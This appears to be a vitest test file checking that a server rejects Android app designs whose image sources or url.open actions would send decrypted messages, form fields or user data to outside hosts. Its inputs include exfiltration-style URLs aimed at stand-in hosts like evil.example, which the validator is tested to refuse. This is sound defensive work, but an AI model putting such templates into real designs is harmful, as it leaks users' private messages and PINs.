// @vitest-environment node
// 6.7 (security analysis F-01, critical): the server refuses designs that could carry
// decrypted content off an Android phone — an image address or url.open argument built
// from $msg / $form / $user…, or a remote image from a host that is not allowed.
// The app enforces the same at run time (android/…/ui/DesignUrls.java, DesignUrlsTest).

import { describe, it, expect, afterAll } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const dir = mkdtempSync(join(tmpdir(), "m5-android-urls-"));
process.env.DATA_DIR = dir;
const design = await import("../server/android/design");

afterAll(() => { rmSync(dir, { recursive: true, force: true }); });

type Node = Record<string, unknown>;

function problemsOf(nodes: Node[], extra: Partial<Record<"menus" | "libraries", unknown>> = {}): string {
  const d = structuredClone(design.DEFAULT_DESIGN) as unknown as Record<string, unknown>;
  (d.screens as Record<string, unknown>).splash = { id: "root", el: "column", children: nodes };
  Object.assign(d, extra);
  try { design.sanitizeDesign(d); return ""; } catch (err) {
    return (err as InstanceType<typeof design.DesignError>).problems.join("\n");
  }
}

describe("6.7 F-01: network-reaching values in a design", () => {
  it("refuses an image address that carries a message, a form field or the user", () => {
    for (const src of ["https://evil.example/{$msg.text}", "https://evil.example/x.png?q={$form.composer}", "https://evil.example/{$user.name|upper}", "{$msg.text}", "data:image/png;base64,{$msg.text}"]) {
      expect(problemsOf([{ id: "i", el: "image", props: { src } }]), src).toMatch(/must not contain \{…\}/);
    }
    expect(problemsOf([{ id: "i", el: "image", props: { src: "='https://evil.example/' + $msg.text" } }])).toMatch(/never a web address/);
    expect(problemsOf([{ id: "i", el: "image", props: { src: "=$msg.text ? '//evil.example' : ''" } }])).toMatch(/never a web address/);
  });

  it("refuses a fixed remote image from a host that is not allowed, and keeps one that is", () => {
    expect(problemsOf([{ id: "i", el: "image", props: { src: "https://cdn.example/logo.png" } }])).toMatch(/cdn\.example is not one of them/);
    expect(design.checkImageSrc("https://cdn.example/logo.png", new Set(["cdn.example"]))).toBeNull();
    expect(design.checkImageSrc("https://other.example/logo.png", new Set(["cdn.example"]))).toMatch(/not one of them/);
    process.env.ANDROID_DESIGN_IMAGE_HOSTS = " CDN.example , img.example";
    try {
      expect(problemsOf([{ id: "i", el: "image", props: { src: "https://cdn.example/logo.png" } }])).toBe("");
    } finally { delete process.env.ANDROID_DESIGN_IMAGE_HOSTS; }
  });

  it("keeps local sources, computed or not (they never leave the phone)", () => {
    expect(problemsOf([
      { id: "a", el: "image", props: { src: "asset:logo.png" } },
      { id: "b", el: "image", props: { src: "=$user.photo" } },
      { id: "c", el: "image", props: { src: "asset:{$app.name}" } },
    ])).toBe("");
    expect(design.checkImageSrc("http://plain.example/x.png")).toMatch(/must be asset:<name> or an https URL/);
  });

  it("url.open takes only a fixed https address — in a tree, a menu and a library", () => {
    expect(problemsOf([{ id: "b", el: "button", text: "x", on: { click: { action: "url.open", arg: "https://evil.example/?{$msg.text}" } } }])).toMatch(/url\.open takes a fixed https address/);
    expect(problemsOf([{ id: "b", el: "button", text: "x", on: { click: { action: "url.open", arg: "=$form.composer" } } }])).toMatch(/url\.open takes a fixed https address/);
    expect(problemsOf([{ id: "b", el: "button", text: "x", on: { click: { action: "url.open", arg: "https://help.example/android" } } }])).toBe("");
    expect(problemsOf([], { menus: { ...structuredClone(design.DEFAULT_DESIGN.menus), x: [{ id: "o", icon: "circle", label: "Open", action: "url.open", arg: "https://e.example/{$msg.text}" }] } })).toMatch(/menus\.x\[0\]: url\.open takes a fixed https address/);
    expect(problemsOf([], { libraries: { leak: { description: "", steps: [{ do: "url.open", arg: "https://e.example/{$form.pin}" }] } } })).toMatch(/libraries\.leak\[0\]: url\.open takes a fixed https address/);
    expect(design.checkActionArg("copy", "{$msg.text}")).toBeNull(); // stays on the phone
  });

  it("the default design passes", () => {
    expect(() => design.sanitizeDesign(structuredClone(design.DEFAULT_DESIGN))).not.toThrow();
  });
});
